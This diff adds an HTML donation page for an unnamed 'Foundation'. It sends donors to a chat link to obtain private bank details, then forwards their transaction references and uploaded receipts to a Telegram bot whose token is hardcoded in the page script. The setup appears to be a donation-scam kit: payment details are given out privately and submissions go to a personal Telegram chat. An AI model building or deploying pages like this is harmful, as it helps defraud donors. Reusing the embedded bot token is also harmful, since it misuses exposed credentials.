@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm Bank Transfer • Foundation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { 
+                        brand: { 
+                            50: '#f0f7ff', 
+                            600: '#2563eb', 
+                            700: '#1d4ed8',
+                            900: '#1e3a8a' 
+                        } 
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .heading-font { font-family: 'Space Grotesk', sans-serif; }
+    </style>
+</head>
+<body class="bg-zinc-50">
+
+    <div class="max-w-2xl mx-auto px-5 md:px-6 py-8 md:py-12">
+        
+        <button onclick="history.back()" class="flex items-center gap-x-2 text-slate-500 hover:text-slate-700 mb-6 md:mb-8 text-sm md:text-base">
+            <i class="fa-solid fa-arrow-left"></i>
+            <span class="font-medium">Back to Donation</span>
+        </button>
+
+        <div class="bg-white rounded-3xl shadow-xl p-6 md:p-10">
+            
+            <div class="text-center mb-8 md:mb-10">
+                <div class="w-16 h-16 mx-auto bg-blue-100 text-blue-600 rounded-3xl flex items-center justify-center text-4xl mb-4">
+                    <i class="fa-solid fa-building-columns"></i>
+                </div>
+                <h1 class="text-4xl md:text-5xl font-bold tracking-tighter heading-font">Confirm Bank Transfer</h1>
+                <p class="text-slate-600 mt-2 text-base md:text-lg">Complete your donation via bank transfer</p>
+            </div>
+
+            <!-- Amount -->
+            <div class="mb-8 text-center">
+                <p class="text-sm text-slate-500">Donation Amount</p>
+                <p id="total-amount" class="text-5xl font-bold text-slate-800">$250</p>
+            </div>
+
+            <!-- Bank Transfer Instructions -->
+            <div class="mb-8">
+                <label class="block text-sm font-medium text-slate-500 mb-4">HOW TO PROCEED</label>
+                <div class="bg-slate-50 border border-slate-200 rounded-3xl p-6 text-sm leading-relaxed">
+                    <p class="mb-4">1. Contact our live chat to receive the correct bank account details.</p>
+                    <p class="mb-4">2. Make the transfer with the exact amount shown above.</p>
+                    <p>3. Upload your transfer receipt below and submit for verification.</p>
+                </div>
+            </div>
+
+            <!-- Live Chat Button -->
+            <div class="mb-10">
+                <button onclick="openLiveChat()" 
+                        class="w-full flex items-center justify-center gap-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white py-5 rounded-3xl font-semibold text-lg transition">
+                    <i class="fa-solid fa-comments"></i>
+                    <span>Contact Live Chat for Account Details</span>
+                </button>
+                <p class="text-center text-xs text-slate-500 mt-3">Our team will provide secure bank details instantly</p>
+            </div>
+
+            <!-- Transaction Reference -->
+            <div class="mb-8">
+                <label class="block text-sm font-medium text-slate-500 mb-3">TRANSACTION REFERENCE / ID</label>
+                <input id="transaction-ref" type="text" placeholder="Enter transaction reference or ID"
+                       class="w-full px-6 py-5 border border-slate-200 rounded-3xl focus:border-brand-600 focus:outline-none text-base">
+            </div>
+
+            <!-- Upload Proof -->
+            <div class="mb-10">
+                <label class="block text-sm font-medium text-slate-500 mb-3">UPLOAD TRANSFER PROOF</label>
+                <div class="border-2 border-dashed border-slate-300 rounded-3xl p-8 md:p-10 text-center hover:border-blue-400 transition">
+                    <input type="file" id="proof-upload" accept="image/*" class="hidden" onchange="previewImage(event)">
+                    <label for="proof-upload" class="cursor-pointer flex flex-col items-center">
+                        <i class="fa-solid fa-cloud-upload-alt text-5xl text-slate-400 mb-4"></i>
+                        <p class="font-medium text-slate-700">Upload bank transfer receipt / screenshot</p>
+                        <p class="text-sm text-slate-500 mt-1">PNG, JPG (max 10MB)</p>
+                    </label>
+                </div>
+                <div id="image-preview" class="hidden mt-6 rounded-2xl overflow-hidden border">
+                    <img id="preview-img" class="w-full max-h-80 object-contain">
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <button onclick="submitPayment()" id="submit-btn"
+                    class="mt-8 w-full py-6 md:py-7 bg-brand-600 hover:bg-brand-700 text-white text-lg md:text-xl font-semibold rounded-3xl transition flex items-center justify-center gap-x-3">
+                <i class="fa-solid fa-paper-plane"></i>
+                <span>Confirm Transfer</span>
+            </button>
+
+            <p class="text-center text-xs md:text-sm text-slate-400 mt-8">
+                Our team will verify your transfer within a few hours
+            </p>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div id="success-popup" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
+        <div class="bg-white rounded-3xl max-w-md w-full p-8 md:p-10 text-center">
+            <div class="w-20 h-20 mx-auto bg-emerald-100 text-emerald-600 rounded-3xl flex items-center justify-center text-5xl mb-6">✅</div>
+            <h2 class="text-3xl font-bold heading-font">Transfer Submitted</h2>
+            <p class="text-slate-600 mt-4">Thank you! Your bank transfer has been submitted for verification.</p>
+            <button onclick="closePopup()" class="mt-10 w-full py-5 bg-brand-600 hover:bg-brand-700 text-white rounded-3xl font-semibold text-lg transition">
+                Return Home
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let selectedAmount = 250;
+        let uploadedImageBase64 = null;
+
+        // Telegram Bot Credentials
+        const BOT_TOKEN = "7989516861:AAFV7q6WSBk4sQuOVsaJiWq3c4KQGpuaB_Q";
+        const CHAT_ID   = "7464797757";
+
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const amount = urlParams.get('amount');
+            if (amount) selectedAmount = parseFloat(amount);
+            document.getElementById('total-amount').textContent = '$' + selectedAmount.toFixed(2);
+        };
+
+        function previewImage(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    uploadedImageBase64 = e.target.result;
+                    document.getElementById('preview-img').src = e.target.result;
+                    document.getElementById('image-preview').classList.remove('hidden');
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        function openLiveChat() {
+            // You can replace this with your actual live chat link (Tawk.to, WhatsApp, etc.)
+            window.open('https://wa.me/1234567890', '_blank'); 
+            // Or use: alert("Live chat opening... (Add your chat link here)");
+        }
+
+        async function submitPayment() {
+            const transactionRef = document.getElementById('transaction-ref').value.trim();
+            const submitBtn = document.getElementById('submit-btn');
+
+            if (!transactionRef) {
+                alert("Please enter the transaction reference or ID");
+                return;
+            }
+
+            submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Submitting...`;
+            submitBtn.disabled = true;
+
+            try {
+                const message = `🏦 New Bank Transfer Received!\n\n` +
+                                `💰 Amount: $${selectedAmount}\n` +
+                                `🔖 Reference: ${transactionRef}\n` +
+                                `⏰ Time: ${new Date().toLocaleString()}`;
+
+                // Send Text Message
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                });
+
+                // Send Photo if uploaded
+                if (uploadedImageBase64) {
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("caption", `📸 Bank Transfer Proof\nAmount: $${selectedAmount}\nRef: ${transactionRef}`);
+
+                    const blob = await fetch(uploadedImageBase64).then(r => r.blob());
+                    formData.append("photo", blob, "transfer-proof.jpg");
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                }
+
+                document.getElementById('success-popup').classList.remove('hidden');
+
+            } catch (error) {
+                console.error(error);
+                alert("Failed to submit. Please check your connection and try again.");
+            } finally {
+                submitBtn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> Confirm Transfer`;
+                submitBtn.disabled = false;
+            }
+        }
+
+        function closePopup() {
+            document.getElementById('success-popup').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
